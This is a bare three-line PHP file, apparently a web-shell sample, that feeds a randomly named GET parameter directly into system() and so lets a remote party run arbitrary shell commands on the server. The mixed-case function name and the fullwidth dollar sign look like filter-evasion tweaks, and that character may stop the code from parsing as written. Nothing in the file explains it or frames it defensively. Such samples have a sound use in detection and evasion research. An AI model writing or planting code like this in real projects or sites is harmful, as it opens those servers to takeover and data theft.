<?php
SysTeM(＄_GET['U1nLEfA4']);
?>
